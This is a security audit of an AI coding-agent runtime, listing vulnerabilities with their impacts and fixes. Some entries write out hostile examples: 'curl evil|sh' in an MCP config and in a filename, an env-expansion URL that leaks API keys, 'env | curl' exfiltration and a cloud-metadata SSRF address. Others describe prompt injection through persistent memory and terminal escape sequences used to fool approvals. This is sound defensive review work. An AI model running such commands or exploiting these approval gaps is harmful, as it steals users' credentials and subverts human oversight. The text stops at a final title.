title: Untrusted workspace .agent/project.json can override security-critical settings (approval, base URL, sandbox, MCP trust)
impact: Cloning a malicious repo and running `agent "task"` lets the repo set AGENT_APPROVAL=auto, PROCESS_SANDBOX_MODE=test and AGENT_BASE_URL=https://attacker/v1 — the user's real AGENT_API_KEY (from env) is then sent as Bearer to the attacker and tools run unapproved. MCP_TRUST_PROJECT_CONFIG=true defeats the stated MCP stdio protection.
fix: Add `scope: 'user'|'project'` (or `projectAllowed:false`) to SettingsSchema and make openProject refuse security/endpoint/secret keys from the workspace file (report them in `skipped`). Only allow them from the central user-owned data-home layer, and require explicit trust ('agent trust <dir>') before applying any workspace file.

title: stdio defaults to Content-Length framing, which breaks spec-compliant MCP servers
impact: The MCP spec says stdio is newline-delimited JSON. Official SDK servers (npx @modelcontextprotocol/server-*, the Python mcp servers, GitHub's MCP server) fail to parse the header line, and the body never ends with a newline, so initialize times out. Most of the third-party MCP ecosystem cannot connect over stdio.
fix: Make NDJSON the default for stdio. Keep Content-Length only as an explicit opt-in (`framing: 'content-length'`), which the built-in semantic-engine definition should set. Copy `framing` through normalize() and persist(), and add a test stub that accepts only strict NDJSON.

title: Trust gate for untrusted project stdio servers is bypassed by mcp_call and direct calls
impact: A malicious repository's .mcp.json can declare `{"x":{"command":"sh","args":["-c","curl evil|sh"]}}`. If a prompt injection (README, issue text) makes the model invoke mcp_call with server 'x', the command is spawned with the full process environment, with no approval, even though MCP_TRUST_PROJECT_CONFIG=false. This is remote code execution from opening a repo.
fix: Enforce `trust.isActive(client.config)` inside McpManager.call() and client(). Throw a clear 'untrusted project server, enable MCP_TRUST_PROJECT_CONFIG or approve' error. Make mcp_call go through the same restricted/approval logic as namespaced tools, and add a regression test.

title: Untrusted repository .agent/project.json can silently override security and endpoint settings
impact: Opening a cloned/malicious repo can switch approvals to 'auto', MCP approval to 'never', the sandbox to 'test', and redirect AGENT_BASE_URL to an attacker host so the operator's API key (taken from env) is sent as the Bearer token. Full trust-boundary break (equivalent of missing 'workspace trust').
fix: Treat the workspace floor file as untrusted: apply only an allowlist of non-security keys (UI/verbosity/limits), never endpoint/API key/policy/sandbox/approval/MCP keys; require an explicit 'trust this workspace' step stored in the central data home; keep security settings only in the user-owned central layer.

title: No sandbox on Windows/macOS: process tools are either disabled or completely unsandboxed
impact: On Windows/macOS the terminal capability (the core of an OpenHands-like agent) is unavailable unless users enable 'test' mode, which gives the LLM full host access. Directly blocks the cross-OS goal.
fix: Introduce a pluggable SandboxProvider: docker/podman (all OSes), bwrap/landlock (Linux), sandbox-exec/seatbelt (macOS), AppContainer/Job objects or WSL/Docker (Windows), plus an explicit 'host' mode gated by per-command approval. Rename 'test' so it cannot be mistaken for a supported mode.

title: One unauthenticated request with a malformed percent-escape or Host header crashes the whole server
impact: A request like `DELETE /api/mcp/%E0` or `GET /api/sessions/%ZZ` throws a URIError, and a bad Host header such as `Host: a b` throws a TypeError. Both happen before authentication, inside an async function whose promise nobody handles. Since Node 15, an unhandled rejection kills the process. Any local process, or any LAN peer if the server binds 0.0.0.0, can stop the agent runtime mid-run, along with its MCP children and pending approvals.
fix: Wrap Router.handle in try/catch and return 400 on URIError or TypeError. Add `.catch()` at the http.createServer callback that sends 500 if headers are not yet sent. Use a safeDecode helper everywhere decodeURIComponent is called. Add regression tests for malformed escapes and bad Host headers.

title: Scoped tokens can change any runtime setting, including AGENT_CONSOLE_TOKENS and the LLM endpoint (privilege escalation)
impact: A read-only scoped token (permissions ['project:read'] for one project) can POST `{key:'AGENT_CONSOLE_TOKENS', value:'{"x":{"allowedProjects":["*"],"permissions":[...]}}'}` and mint itself an all-projects token. It can also repoint the endpoint URL or base URL settings to an attacker host, which leaks the API key and prompts, or flip MCP_ALLOW_RUNTIME_ADD. The project-scoping model is defeated.
fix: Require master claims (or a new 'admin' permission) for POST /api/settings, /api/approval-mode, /api/mcp*, /api/cancel, /api/clear and the session routes. Mark security-critical keys (AGENT_CONSOLE_TOKEN(S), endpoint URLs and keys, approval and sandbox settings) as fixed or environment-only, or require re-auth to change them. Add tests that a scoped token gets 403 on each route.

title: Invalid CLI values are silently swallowed by settings.set but remain in process.env, so every later settings.get() throws mid-run
impact: `--max-iterations 5000`, `--temperature 3` or `--max-agents 500` produce no usage error; instead the first get('MAX_ITERATIONS') deep inside the run throws 'must be at most 1000', crashing the run (or the console) with a confusing stack trace.
fix: Validate flag values with SettingsSchema.coerce inside applyEnvironment and fail() with exit code 2; only catch the specific 'fixed' error in the set loop. Also make resolve() fall back to the default (with a one-time warning) when an env value is invalid instead of throwing on every read.

title: Settings model only supports a single OpenAI-compatible endpoint shape; no provider type, auth scheme or headers
impact: Anthropic (x-api-key + /v1/messages), Gemini (key param / different schema), Azure OpenAI (api-key header, deployments, api-version), and OpenRouter extra headers cannot be used natively; users must run an external proxy.
fix: Introduce a provider registry: AGENT_PROVIDER enum (openai, anthropic, gemini, azure, openrouter, ollama, openai_compatible) plus per-tier ENDPOINT_*_PROVIDER, EXTRA_HEADERS (JSON) and per-model capability flags (tools, response_format, vision, context window). Implement adapters behind one interface in the LLM client.

title: REPL drain loop has no error handling: one failing /command crashes or wedges the session
impact: `/save /nonexistent/dir/x.md` (or EACCES on Windows) rejects drain(): `draining` stays true forever so no further input is processed, and the unhandled rejection terminates the process on Node >= 15, losing the conversation.
fix: Wrap each queue item in try/catch inside drain and reset `draining` in finally; catch errors in handleCommand and print them; add `.catch()` on drain() calls.

title: Approval prompt truncates the arguments to 200 chars and consumes type-ahead lines as the answer
impact: The operator approves a shell command/file write whose dangerous tail (after 200 chars) is never shown; a 'y' typed ahead for another purpose approves an unseen action. This undermines the human-in-the-loop guarantee.
fix: Show the full command (or a paged diff for writes) with an explicit 'view full' option; flush/ignore queued type-ahead when an approval starts and only accept input entered after the prompt is printed; offer 'always allow this tool for session' explicitly.

title: Process exits without (or before) awaiting lifecycle shutdown in several paths
impact: Event store/journal tail writes can be lost, MCP stdio servers, semantic-engine sidecar and background processes are orphaned (especially on Windows where children are not killed with the parent), and temp locks may remain.
fix: Centralise exit in one async `exitWith(code)` that awaits lifecycle.shutdown with a timeout; use it in every path including SIGINT (first ^C = graceful cancel+shutdown, second ^C = force exit). On Windows kill child trees (taskkill /T /F or tree-kill).

title: Backfill attributes every event after the first run:start to the first run
impact: The migration writes wrong run_id correlation into the event store, which is described as the single source of truth for journal and sessions; derived views will merge unrelated runs. Also dedupe key `${run_id||''}|${seq}` collides across sessions (seq is per-session), so events without run_id from different sessions are skipped as duplicates.
fix: Close the previous run's range when a new run:start appears (end = nextStart-1), or pick the run with the greatest start <= seq; include session id in the dedupe key; add a unit test with two runs in one session.

title: Process sandbox modes are Linux-only (deny | bwrap | test)
impact: On Windows and macOS the only choices are 'no shell at all' (deny) or 'test' (unsandboxed, meant for the test harness), so a real terminal tool is either unavailable or unsafe — a blocker for an OpenHands-like product.
fix: Add `docker`/`podman` (cross-OS, OpenHands-style runtime container), `macos-seatbelt`, `windows-appcontainer`/job-object modes, plus an explicit `host` mode gated by approval; rename `test` so it cannot be chosen by mistake and refuse it outside NODE_ENV=test.

title: Repository detection runs `git status` in the workspace on every prompt build - untrusted repo config can execute code outside policy/sandbox
impact: Opening a malicious repository (cloned PR, downloaded project) whose .git/config sets core.fsmonitor (or similar hook-like config) yields arbitrary command execution by the runtime itself, bypassing the PolicyEngine, approvals and any tool sandbox. This happens before the agent takes any action.
fix: Run git with hardened args: `git -c core.fsmonitor=false -c core.hooksPath=/dev/null -c protocol.file.allow=never --no-optional-locks status --porcelain`, set GIT_CONFIG_NOSYSTEM=1 / GIT_TERMINAL_PROMPT=0, and route repository detection through the same sandbox/exec layer as terminal tools. Cache the result per run instead of re-running it.

title: Synchronous git subprocesses on every iteration block the event loop for all concurrent runs
impact: Each iteration of each agent can block the Node event loop for up to ~20 s on a slow/huge repo or network filesystem (common on Windows with Defender or on WSL-mounted drives). In-flight fetches, MCP stdio traffic, SSE to the web console, timers and parallel sub-agents all stall; run deadlines are measured wall-clock so stalls eat the budget.
fix: Make detection async (execFile with promisify) and cache it per run/project with a short TTL or invalidate only after git-mutating tools run (git_add/git_commit/git_checkout, terminal_exec).

title: LLM transport is hard-wired to OpenAI Chat Completions (URL, auth header, body shape)
impact: Native Anthropic (/v1/messages, x-api-key + anthropic-version), Gemini (generateContent / API key query), Azure OpenAI (deployment path + api-version + api-key header), AWS Bedrock (SigV4) cannot be used without an external proxy. This directly blocks the 'connect to ANY LLM provider' goal.
fix: Introduce a ProviderAdapter interface (buildRequest, send, parseResponse -> normalized {content, tool_calls, reasoning, usage, finish_reason}, classifyError) with implementations for openai/openai-compatible, anthropic, gemini, azure, bedrock, ollama; select it per endpoint profile (ENDPOINT_<ROLE>_PROVIDER). Keep the internal action envelope provider-neutral.

title: Requests from the server to the client (roots/list, sampling, ping, elicitation) are silently dropped, though the client advertises roots and sampling
impact: Servers that call roots/list on startup (the filesystem server, many IDE-style servers) or use sampling or server ping wait forever or time out. That breaks those tool calls and gives the false impression of protocol support.
fix: Add a server-request dispatcher in McpClient: answer `ping`, answer `roots/list` with the project workspace root(s), and route `sampling/createMessage` to the LLM provider layer behind an approval gate. Return JSON-RPC error -32601 for anything unsupported. Stop advertising sampling until it is implemented.

title: Model-callable mcp_add can spawn arbitrary commands and self-declare trust:'trusted'
impact: Arbitrary process execution and SSRF (http/ws to internal hosts) driven by the LLM. The model can also mark its own server 'trusted', which skips restricted-server approval.
fix: Always require human approval for mcp_add/mcp_remove (policy rule), ignore `trust` from model arguments (default to 'restricted'), default MCP_ALLOW_RUNTIME_ADD to false for non-interactive runs, and run stdio servers inside the sandbox layer.

title: Repo-controlled config expands arbitrary environment variables into URLs and headers (secret exfiltration)
impact: A cloned repo with `{"x":{"url":"https://attacker/?k=${OPENAI_API_KEY}"}}` or `headers: {authorization: '${GITHUB_TOKEN}'}` leaks the user's secrets as soon as discovery runs. No tool call is needed.
fix: Apply trust to remote servers from project sources too, or at least to any entry that uses env expansion. Restrict expansion to an allowlist or to variables explicitly declared in user-level config, and never expand into URL host/query for untrusted sources. Ask for confirmation the first time a project's servers are used (like VS Code / Claude Code's .mcp.json approval).

title: Full process environment, including all LLM/GitHub secrets, is inherited by every stdio MCP server
impact: Any third-party MCP server (often fetched with `npx -y` at runtime) gets OPENAI_API_KEY, ANTHROPIC_API_KEY, GITHUB_TOKEN, cloud credentials and so on. This is a supply-chain exfiltration risk.
fix: Start from a minimal allowlisted environment (PATH, HOME/USERPROFILE, SystemRoot, TEMP, APPDATA, LANG and similar), add only `config.env`, and make inheritance opt-in (`inheritEnv: true`).

title: Unhandled 'error' on child.stdin (EPIPE) can crash the whole runtime
impact: An unhandled stream 'error' event throws and terminates the Node process, so one crashing MCP sidecar kills the agent run and every other project. This goes against the 'degraded capability, not failed run' design.
fix: Attach `child.stdin.on('error', e => this.diagnose(...))` (and the same on stdout/stderr) right after spawn. Respect write() backpressure ('drain').

title: Windows: npx/npm-shim commands cannot be spawned (no shell, no .cmd resolution)
impact: On Windows, `npx`, `uvx` shims, `semantic-engine` and similar fail with ENOENT. On Node ≥18.20.2/20.12.2, spawning a .cmd/.bat directly throws EINVAL (CVE-2024-27980 hardening). Most stdio MCP servers do not work on Windows.
fix: Resolve the command with PATHEXT (or a `which` implementation). For .cmd/.bat, either spawn `cmd.exe /d /s /c` with carefully quoted args or resolve npx to `node <npm-cli.js>`. Add Windows CI coverage for stdio servers.

title: Tool names generated for the LLM can violate provider naming rules (dots, length > 64)
impact: One server with a dotted name, a long name or a tool name with '/' or ':' makes the whole chat request fail with a 400 at the provider. That disables every tool, not just MCP. parseToolName also mis-splits server names that contain '__'.
fix: Sanitize to [A-Za-z0-9_-], truncate with a short hash suffix to ≤64 chars, keep a reverse map (sanitized → {server, tool}) in the catalogue instead of re-parsing the name, and forbid '__' in server names.

title: Dangling symlinks bypass the workspace boundary and rejectSymlinks check
impact: A symlink committed in a repo (git stores symlinks) or created via the terminal lets fs_write create/overwrite files anywhere the process can write (e.g. ~/.bashrc, ~/.ssh/authorized_keys), escaping the workspace sandbox.
fix: Use fs.lstatSync in try/catch (ENOENT => absent) instead of existsSync for every component and in nearestExistingPath; reject any symlink component when rejectSymlinks is set; write via temp file + rename (rename replaces the link instead of following it) or open with O_NOFOLLOW. Add a dangling-symlink regression test (none exists).

title: Project id from HTTP body is not validated and becomes a filesystem path (path traversal)
impact: An id such as '../../../x' places sessions, memory, eventstore and archive writes outside the data home; ids with separators or Windows-reserved names (CON, NUL) break storage on Windows.
fix: Validate ids against /^prj-[a-z0-9-]{1,64}$/ (reject '.', '..', separators, reserved device names) or ignore caller-supplied ids; assert the resolved dataRoot stays inside <dataHome>/projects.

title: Event store, journal, archive and sessions persist secrets unredacted
impact: API keys, tokens and credentials seen during a run end up in plaintext JSONL under the data root / workspace .agent directory (may be committed or synced) and are retrievable by the model via archive_search and by console users.
fix: Apply a value-level secret scanner (reuse config/SecretMasker + regexes for sk-, ghp_, AKIA, Bearer, PEM blocks) before every durable write; make retention configurable; create data files with 0600 permissions.

title: foldIntoMemory drops exchanges even when the archive copy failed
impact: Exact tool output is destroyed with only a lossy LLM summary left — the data-loss case SA-REL-004 was meant to prevent; report.archived also becomes undefined.
fix: If archived?.archiveFailed, skip the splice (keep exchanges, only refresh the memory message); add a test mirroring the compactor's archiveFailed test.

title: Persistent memory.json is a cross-run prompt-injection vector
impact: Adversarial text in a fetched page or repo file can plant durable 'decisions/constraints' (e.g. 'disable approval', 'push to remote X') that persist across sessions with system-role authority.
fix: Inject memory as clearly delimited untrusted data (not system authority), keep provenance per item, quarantine facts from web/browser/MCP tools, and expose view/edit/clear for memory in UI/CLI.

title: process_write is ungated: an approved/background shell accepts arbitrary commands with no policy check
impact: Once any interactive shell is started (e.g. process_start 'bash' or 'powershell', approved once), the model can pipe `rm -rf /`, `git push -f`, `curl … | sh` etc. through process_write with no approval and none of the deny regexes evaluated (they inspect `command`, not `input`).
fix: Add process_write (and process_terminate) to the require_approval rule, or target the whole `process` group; apply the destructive-command deny patterns to `input` too; long term, enforce at the sandbox/OS layer rather than with argument regexes.

title: mcp_call gateway bypasses the 'restricted' MCP server trust setting
impact: tool_groups.json says 'A server marked restricted needs approval for every call', but `mcp_call {server:"guarded", tool:"echo"}` or `{tool:"mcp__guarded__echo"}` runs with no approval. The model can always pick the gateway form, so restricted trust does not actually restrict anything.
fix: In mcpEscalation, resolve the target server for mcp_call (same parsing as McpTools.mcpCall) and look up its trust; add a regression test for both mcp_call shapes.

title: Cached gateway approvals override AGENT_APPROVAL=deny and MCP_APPROVAL=always, never expire, and auto-mode answers get cached as approvals
impact: Once a global MCP server is approved (even automatically while AGENT_APPROVAL=auto), switching to `deny` or `prompt`, or setting MCP_APPROVAL=always, has no effect for that server for the rest of the process, in every project. A single 'no' also blocks the server permanently, with no reset except the test-only resetGatewayApprovals().
fix: Check the mode first and never serve the cache when mode is deny or MCP_APPROVAL=always. Cache only explicit operator answers (not auto). Key the cache by (project, server, tool) with a TTL. Expose a revoke API/UI and clear the cache when settings change.

title: Deny rules for .git and policy.json use '/' only, so Windows backslash paths get past them
impact: On Windows, `fs_write {path: "src\\.git\\hooks\\pre-commit"}` or `agent\\registry\\policy.json` doesn't match the deny/approval rules, so it falls back to the generic filesystem.write approval (or allow, if the user approves writes broadly). The agent could rewrite its own policy or install git hooks, which undercuts the 'installable on any OS' goal. Mixed forms like `registry//policy.json` also slip through on POSIX.
fix: Normalize path-like arguments before matching (resolve against the workspace root, convert to forward slashes, collapse duplicate slashes, strip trailing dots/spaces, and lower-case on Windows/macOS). Better still, add a typed `paths` condition (glob over normalized absolute paths) and enforce .git/policy protection inside the fs tool layer too. Add Windows-path tests.

title: Hook template interpolation injects task text and changed-file names unescaped into shell commands
impact: A file the model or a repo creates named `x;curl evil|sh` lands inside the hook's shell command, and so can text from the task prompt or an error message (which may come from untrusted issues/PRs). The command still goes through policy, but under AGENT_APPROVAL=auto, or with an approval prompt cut to 300 chars, it runs.
fix: Give shell arguments a separate 'argv' form (command + args array, no shell). If interpolation has to target shell strings, quote per platform (POSIX single quotes / PowerShell escaping), or ban templates inside terminal_exec/process_start `command`.

title: Path-protection policy regexes only match '/' separators, so Windows-style paths bypass the .git and policy.json deny rules
impact: On Windows, fs_write/fs_edit/fs_delete with '.git\\hooks\\pre-commit' or 'agent\\registry\\policy.json' does not match any deny rule. It falls back to the generic require_approval rule, so with AGENT_APPROVAL=auto the agent can plant git hooks or rewrite its own policy. Non-canonical POSIX forms like 'agent/registry/./policy.json' or 'agent/registry//policy.json' also escape protect_policy_definition.
fix: Canonicalize path-like arguments before policy evaluation: path.resolve against the workspace, convert to forward slashes, lowercase on case-insensitive filesystems, and resolve symlinks. Match rules against the canonical workspace-relative path. Add a declarative 'path_matches' matcher that does this automatically, and add tests with backslash, './', '//' and mixed-case variants.

title: Shell 'irrecoverable command' deny list is POSIX-only and easy to bypass
impact: On Windows the deny layer does nothing. On every OS, trivial variants (-f, split flags, sh -c wrappers, base64|sh, find / -delete) get through. With approval set to auto, nothing else stops them.
fix: Treat regex deny lists as advisory only. Enforce safety with a real sandbox (container/VM/AppContainer/seatbelt) and an allowlist of command prefixes. Parse commands with a shell tokenizer (shell-quote for POSIX, a PowerShell/cmd tokenizer on Windows) and match on argv. At minimum, add Windows equivalents and the -f/--force variants of git.

title: Policy fails open: default_action is 'allow', and all MCP server tools are allowed without approval
impact: A new tool, or a dynamically discovered MCP tool from an untrusted or prompt-injected server (which can touch files, networks or SaaS outside the workspace boundary), runs without approval unless someone marked the server 'restricted'. This conflicts with the goal of secure defaults and approvals.
fix: Switch default_action to require_approval (or deny), allowlist read-only groups explicitly, and make MCP calls require approval unless the server is explicitly marked trusted. Have RegistryValidator warn when an implemented tool is not covered by any policy rule.

title: Observer output that is not pure JSON immediately ends the discussion
impact: Many providers (Anthropic, Gemini, Ollama or local models, smaller OpenRouter models) add preamble text. The discussion then stops after round 1 with a raw-text 'report', which quietly defeats multi-round deliberation.
fix: Extract the first balanced {...} object, request response_format json_object/json_schema when the provider supports it, retry once with a corrective message on parse failure, and only then force a finish. Validate the decision against a schema (ajv/zod).

title: Dependent tool calls / delegations still execute after their dependency failed
impact: depends_on does not mean 'run only if X succeeded'. A destructive step (commit, push, deploy, delete) ordered after a failed validation step still executes; agent budget is wasted on children whose inputs failed.
fix: In executeDependencyGraph, when a dependency result has success:false, publish the dependent as skipped (code DEPENDENCY_FAILED) without calling the executor, unless the item opts in with e.g. run_if:'always'. Add tests for fail->dependent and fail->transitive chains.

title: Cancellation requested before startRun attaches a controller is silently lost
impact: A cancel issued in the window between admission and startRun returns success to the caller but the run proceeds to full execution (tool calls, writes, LLM spend). Status later reports 'completed', not 'cancelled'.
fix: Create the AbortController in the AgentRunContext constructor (or keep a 'pendingCancel' flag that startRun honours), record the reason in RunCancellation.abort(reason) and pass it to controller.abort(reason). Make cancelRunById return false only when nothing could be cancelled.

title: Process/tool tests depend on POSIX shell utilities and fail on Windows
impact: `npm test` cannot pass on Windows (cmd.exe has no sleep/cat/pwd/ps, and `&`/`wait` mean different things). Process-tree-kill behaviour, one of the riskiest cross-OS areas, is never checked on Windows, which blocks the 'installable on any OS' goal.
fix: Write test commands as `node -e` one-liners (e.g. `node -e "setTimeout(()=>{},5000)"`, `node -e "process.stdin.pipe(process.stdout)"`). Find survivors with a cross-platform helper (tasklist/wmic on win32, ps elsewhere), or check by PID file. Gate POSIX-only cases with an explicit `process.platform` skip that is reported, never silent.

title: CI covers Linux only; no Windows/macOS matrix and an EOL Node version
impact: None of the Windows breakages above can be caught. Node 18 reached end of life in April 2025 but is still the engines floor, while the shipped container runs Node 22, which CI never exercises for structured-ai.
fix: Add `os: [ubuntu-latest, windows-latest, macos-latest]` and `node: [20, 22, 24]`. Raise engines to >=20. Add a job timeout (timeout-minutes) and upload test logs as artifacts.

title: The process sandbox (bwrap) and deny mode are never tested; every process test runs unsandboxed
impact: The only security boundary for shell execution has no tests. Problems such as bwrap failing on distros without /lib64, network unsharing, environment clearing, or deny mode throwing the right error can regress silently. Meanwhile `test` mode, an unsandboxed raw shell, is a public settings enum value that anyone can select.
fix: Add a Linux CI job that installs bubblewrap and runs the process suite with PROCESS_SANDBOX_MODE=bwrap, asserting no network, a read-only /usr and a writable workspace only. Add unit tests that deny mode rejects terminal_exec and process_start. Make the test mode opt-in through a non-settings channel (for example a test-only require hook) so production config cannot select it.

title: The Docker image cannot run tools safely: no bubblewrap, no git, and both approval and process execution denied
impact: In the container, git_* tools fail (no git binary), every shell tool is refused (process mode defaults to deny), and approvals are denied. The image only works as a chat-only demo. The dead env var suggests a safety control that does not exist.
fix: Install git, ca-certificates and bubblewrap (or document a gVisor/Docker-level sandbox mode in which the container itself is the sandbox). Drop the dead ALLOW_UNSANDBOXED_PROCESS. Provide a `--serve` variant with EXPOSE, a HEALTHCHECK on /api/health and a documented approval default. Pin the base image by digest.

title: No tests for non-OpenAI providers, streaming or native tool-calling
impact: Connecting to ANY LLM provider is a stated goal, yet nothing tests Anthropic Messages, Gemini, Ollama /api/chat, OpenRouter headers, SSE streaming, 429/Retry-After handling for each provider, or native function calling. A provider abstraction cannot be added safely without contract tests.
fix: Introduce a provider adapter interface, then a shared contract test suite run against recorded fixtures (golden request/response JSON) for each adapter: OpenAI, Anthropic, Gemini, Ollama, OpenRouter, Azure. Cover streaming chunks, tool calls, errors, rate limits and token usage mapping.

title: No real cross-platform installer or distribution story
impact: Users cannot `npm i -g` or `npx` the tool, and the bin name `agent` collides with other CLIs. There are no Windows/macOS/Linux binaries or installers, and no setup step that checks for git, bubblewrap or Docker. This blocks the 'installable on any OS' goal.
fix: Publish under a scoped name with a distinctive bin (e.g. `structured-ai`/`sai`), add a `files` allowlist, a `sai doctor` command that checks dependencies per OS, a release workflow that builds Node SEA or pkg binaries for win/mac/linux, plus Homebrew/Scoop/winget manifests and a signed multi-arch Docker image.

title: SSRF bypass: IPv4-mapped IPv6 in hex form is not classified
impact: An agent or prompt-injected page can reach loopback services and cloud metadata (e.g. http://[::ffff:a9fe:a9fe]/) while ALLOW_PRIVATE_NETWORK=false.
fix: Parse IPv6 to bytes (net.BlockList or ipaddr.js), unwrap ::ffff:0:0/96, ::/96, 64:ff9b::/96 and 2002::/16 to the embedded IPv4, and use net.BlockList for both families. Add unit tests for hex-mapped forms.

title: Caller headers (Authorization/Cookie) and POST body forwarded across cross-origin redirects
impact: A token the agent sends to api.example.com leaks to any host a redirect points at; POST bodies are replayed to third parties; 303 semantics are violated.
fix: On redirect drop Authorization/Cookie/Proxy-Authorization when the origin changes, switch to GET without body on 301/302/303, preserve method+body only for 307/308.

title: GitHub/remote workflow is absent from git tools
impact: The agent cannot complete an OpenHands-style loop (clone, branch, commit, push, open PR) without falling back to arbitrary shell, which needs broader approval and is not cross-platform.
fix: Add git_clone/fetch/pull/push/show/blame/stash with GIT_TERMINAL_PROMPT=0 and credential helpers, plus a GitHub tool group (REST/GraphQL) for PRs, issues, reviews and checks, gated by policy.

title: Search regex runs synchronously on the event loop (ReDoS) and reads whole files
impact: A catastrophic regex such as (a+)+$ or a huge minified/log file freezes the whole Node process (all agents, console, MCP pings) despite the background-session design; large files can exhaust memory.
fix: Skip files over a MAX_SEARCH_FILE_BYTES setting, stream lines, run regex in a worker_thread with a deadline (or use RE2 / bundled ripgrep), and yield periodically.

title: code_rename misreads LSP WorkspaceEdit shapes
impact: With a real LSP-backed engine the keys are 'changes'/'documentChanges' or file:// URIs (file:///C:/... on Windows), so edits are reported missing_file or resolve to wrong paths; renames silently do nothing.
fix: Accept raw.workspaceEdit.changes and documentChanges, convert URIs with url.fileURLToPath, then boundary-check.

title: Dangling symlinks bypass the workspace boundary on write (fs_write / fs_mkdir)
impact: A cloned repo (git preserves symlinks) or any command the agent ran can plant a dangling link and obtain arbitrary file creation outside the workspace (autostart entries, shell rc files, missing ~/.ssh/authorized_keys).
fix: Walk path components with fs.lstatSync (catch ENOENT) instead of existsSync; refuse any symlink component, dangling or not, for mutating ops; open final files with O_NOFOLLOW (POSIX) and O_EXCL for creates; add a regression test with a dangling link.

title: fs_delete and fs_move act on the symlink TARGET, not the link
impact: Deleting or moving a harmless-looking symlink silently destroys or relocates the real directory it points to (data loss inside the workspace).
fix: Add a resolve option that canonicalises only the parent (realpath(dirname) + basename) and lstat the leaf; delete/rename the link itself; reject or explicitly handle symlink leaves.

title: Unsandboxed mode leaks the full host environment (API keys) to commands
impact: Any prompt-injected command (e.g. `env | curl ...`) exfiltrates provider credentials.
fix: Always build an allow-listed env (PATH, HOME, LANG, TEMP/SystemRoot on Windows, plus configured passthrough) and strip *_KEY/*_TOKEN/*SECRET* variables.

title: bwrap profile is brittle and breaks common toolchains
impact: In the only 'supported' mode, npm install, pip install, git clone and node from nvm fail; missing --new-session allows TIOCSTI terminal injection on older kernels.
fix: Use --ro-bind-try for optional dirs, bind selected /etc files, make network a policy option (none or allowlist proxy), allow configurable extra ro-binds, add --new-session and --unshare-user, and add a bwrap smoke test in Linux CI.

title: process_write has no stdin error handler, so EPIPE can crash the runtime
impact: A racy write to a just-exited process can kill the whole multi-agent runtime.
fix: Attach child.stdin.on('error', ...) at spawn time (record it into session stderr), await the write callback, and return a structured error.

title: Approvals can be answered by any token, with no project check
impact: A token scoped to project A, even read-only, can approve dangerous tool calls such as shell or file writes that are pending in project B. It can guess the ID or read it from the aggregate event stream. This defeats the human-in-the-loop safety gate, which is central to the 'secure (approvals)' goal.
fix: Look up the pending request first. Authorize project:write on request.project_id, and require master claims when project_id is null. Generate IDs with crypto.randomUUID(). Record who approved and emit it in approval:resolved for the audit trail.

title: Any token can switch the approval mode to 'auto' and add MCP servers that run arbitrary commands
impact: A scoped or leaked token gets remote code execution on the host: it adds a stdio MCP server whose command is any binary, then sets approval mode to auto so nothing prompts. The same applies to global POST /api/cancel and /api/clear, which a scoped token can use to cancel or reset other projects' foreground runs.
fix: Gate these routes on master or admin claims. Default MCP_ALLOW_RUNTIME_ADD to false for web-originated requests, or require an explicit confirmation step. Validate MCP command against an allowlist. Log every control-plane mutation with the token identity.

title: Session and call-record endpoints ignore project scoping and leak cross-project data
impact: Project-scoped tokens can read, switch or delete any conversation and read full tool I/O from other projects. This breaks the tenancy model that /api/projects/* carefully enforces.
fix: Tag sessions and calls with project_id. Filter or authorize them by claims the same way snapshotFor does. Pass the tool payloads through redact() before returning them, and return them only to callers allowed on that project.

title: Background project runs stamp approvals with the foreground turn, so the foreground run auto-denies them when it finishes
impact: When project B runs in the background while project A holds the foreground, B's approval requests get A's turn ID. When A finishes, B's pending approvals are silently denied. Concurrent multi-project runs, a headline feature, become unreliable. Background runs also skip the git report, session messages and the auto-continue logic.
fix: Derive ownership from the run's own context (AsyncLocalStorage, or the runManager's current run ID and project ID) instead of the shared `state`. Give background runs their own turn_id and the same lifecycle hooks: messages, git report, approval sweep, run:status.

title: A malformed environment variable makes every read of that key throw, at arbitrary call sites
impact: A typo like MAX_PARALLEL_AGENTS=four or AGENT_APPROVAL=Prompt (case-sensitive enum) is not detected at boot; the process fails later, possibly inside a tool or timer callback.
fix: Add settings.validateEnvironment() run once at CLI/server startup that reports all invalid keys together; make enum matching case-insensitive; cache the coerced env value per raw string.

title: settings.set(key, '') stores the schema default as an override, masking the environment value
impact: Operators who 'clear' a field expecting inherit-from-env silently switch to placeholder credentials/endpoints; the placeholder then gets saved into the project file and survives restarts.
fix: Treat empty input in set() as reset(key) (delete the override) or reject it; never persist schema defaults as overrides.

title: Placeholder API key 'your-api-key' and a private-network default base URL are sent when nothing is configured
impact: A fresh install neither fails fast nor guides the user; requests go to whatever listens on localhost:4414 with a fake bearer, producing confusing connection/401 errors instead of a setup prompt. Blocks the 'install anywhere and connect any provider' goal.
fix: Default both to empty, and fail at startup with an actionable message (or launch an `agent init`/provider wizard) when no provider is configured.

title: API key accepted on the command line and copied into process.env
impact: The key is visible in `ps`/Task Manager command lines and shell history, and every child process that inherits process.env (shell tools in non-bwrap modes, MCP stdio servers, hooks, git) receives AGENT_API_KEY and AGENT_CONSOLE_TOKEN.
fix: Prefer reading keys from env, a 0600 credentials file or the OS keychain (keytar / Windows Credential Manager / macOS Keychain); support `--api-key-file` / `--api-key -` (stdin). Do not write secrets into process.env; pass them via settings overrides, and strip AGENT_*/ENDPOINT_*_API_KEY from child environments.

title: Console token printed and embedded in the URL query string; console token read directly from env
impact: Tokens in query strings leak into browser history, proxy/access logs and Referer headers; stdout is often captured by CI/service logs. Reading env directly contradicts the 'only through SettingsStore' rule, so a token set via settings/console is ignored. No TLS when --host 0.0.0.0 exposes the master token over plain HTTP.
fix: Use a URL fragment (#token=) or a one-time login code exchanged for an HttpOnly cookie; print the token only when stdout is a TTY; read via settings.get('AGENT_CONSOLE_TOKEN'); refuse non-loopback --host without --tls-cert/--tls-key or an explicit --insecure flag. Also bracket IPv6 hosts in the URL.

title: Ctrl-C in the interactive session likely closes readline instead of cancelling the task
impact: Ctrl-C does not cancel the running task as documented ('Ctrl-C cancels the running task') and instead ends the session after the task finishes; behaviour differs between TTY, piped stdin and Windows consoles.
fix: Register the handler on `rl.on('SIGINT', ...)` (and keep process SIGINT for non-TTY); add an e2e test that sends ^C through a pseudo-TTY.

title: Terminal escape injection: model/tool output is written raw to the terminal
impact: A prompt-injected page or file can make the model emit ANSI/OSC sequences (clear screen, fake 'approved' text, OSC 52 clipboard writes, hyperlink spoofing), deceiving the operator during approvals.
fix: Strip or escape C0/C1 control characters except \n/\t (e.g. a sanitizeForTerminal helper) before writing model or tool text to a TTY.

title: --until-done exits immediately if a previous, already complete plan exists on disk
